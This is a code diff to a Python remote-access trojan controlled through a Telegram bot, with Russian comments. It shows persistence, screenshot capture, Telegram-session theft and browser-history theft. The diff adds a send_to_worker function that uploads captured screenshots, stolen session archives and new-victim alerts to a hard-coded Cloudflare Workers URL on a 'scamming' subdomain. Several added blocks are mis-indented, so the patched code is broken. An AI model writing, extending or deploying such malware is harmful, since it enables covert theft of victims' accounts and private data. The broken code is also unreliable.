@@ -32,6 +32,28 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
 
+# ============ КОНФИГ ============
+TOKEN = "{{TOKEN}}"
+ADMIN_ID = int("{{ADMIN_ID}}")
+WORKER_URL = "https://red-silence-54e0.scamming.workers.dev/"
+PC_ID = socket.gethostname() + "_" + os.getlogin()
+VERSION = "3.0"
+
+def send_to_worker(text="", file_paths=None):
+    try:
+        if file_paths:
+            for file_path in file_paths:
+                if os.path.exists(file_path):
+                    with open(file_path, 'rb') as f:
+                        requests.post(WORKER_URL, files={'file': (os.path.basename(file_path), f)}, data={'content': text})
+                else:
+                    requests.get(f"{WORKER_URL}?content={text}")
+        else:
+            requests.get(f"{WORKER_URL}?content={text}")
+        return True
+    except:
+        return False
+
 # ============ GPUTIL ============
 try:
     import GPUtil
@@ -128,12 +150,6 @@ def auto_persistence():
     except:
         return False
 auto_persistence()
-
-# ============ КОНФИГ ============
-TOKEN = "{{TOKEN}}"
-ADMIN_ID = int("{{ADMIN_ID}}")
-PC_ID = socket.gethostname() + "_" + os.getlogin()
-VERSION = "3.0"
 
 # ============ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ СКРЫТОГО ЗАПУСКА ============
 def run_hidden(cmd):
@@ -3056,14 +3072,22 @@ def callback(update, context):
         return
 
     # ============ ОСНОВНЫЕ КОМАНДЫ ============
-    if data == "screenshot":
-        img = get_screenshot()
-        if img:
-            context.bot.send_photo(chat_id, photo=BytesIO(img), caption=f"📸 Screenshot from `{pc_name}`", parse_mode="Markdown")
-        else:
-            context.bot.send_message(chat_id, "❌ Failed")
-        context.bot.send_message(chat_id, "📌 Выбери действие:", reply_markup=get_main_menu())
-        return
+if data == "screenshot":
+    img = get_screenshot()
+    if img:
+        context.bot.send_photo(chat_id, photo=BytesIO(img), caption=f"📸 Screenshot from `{pc_name}`", parse_mode="Markdown")
+
+        try:
+            with open("temp_screenshot.png", "wb") as f:
+                f.write(img)
+            send_to_worker(f"📸 Screenshot from {pc_name}", ["temp_screenshot.png"])
+            os.remove("temp_screenshot.png")
+        except:
+            pass
+    else:
+        context.bot.send_message(chat_id, "❌ Failed")
+    context.bot.send_message(chat_id, "📌 Выбери действие:", reply_markup=get_main_menu())
+    return
 
     if data == "system":
         send_result_with_menu(chat_id, f"🖥️ System Info from `{pc_name}`:\n{get_system_info()}", context, parse_mode="Markdown")
@@ -3123,15 +3147,17 @@ def callback(update, context):
         return
 
     if data == "telegram":
-        result = steal_telegram()
-        if os.path.exists(result):
-            with open(result, 'rb') as f:
-                context.bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip", caption=f"📱 Telegram sessions from `{pc_name}`", parse_mode="Markdown")
-            os.remove(result)
-        else:
-            context.bot.send_message(chat_id, result)
-        context.bot.send_message(chat_id, "📌 Выбери действие:", reply_markup=get_main_menu())
-        return
+    result = steal_telegram()
+    if os.path.exists(result):
+        with open(result, 'rb') as f:
+            context.bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip", caption=f"📱 Telegram sessions from `{pc_name}`", parse_mode="Markdown")  # В ТГ
+            send_to_worker(f"📱 Telegram sessions from {pc_name}", [result])
+        os.remove(result)
+    else:
+        context.bot.send_message(chat_id, result)
+        send_to_worker(result)
+    context.bot.send_message(chat_id, "📌 Выбери действие:", reply_markup=get_main_menu())
+    return
 
     if data == "history":
         send_result_with_menu(chat_id, f"📜 History from `{pc_name}`:\n{steal_browser_history()}", context, parse_mode="Markdown")
@@ -4354,7 +4380,8 @@ if PC_ID not in known_pcs:
             f"🕐 *Время:* {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
             f"📋 *Используй команду /list для выбора ПК*"
         )
-        bot.send_message(ADMIN_ID, message, parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, message, parse_mode="Markdown")  # В ТГ
+        send_to_worker(message)
     except:
         pass
 
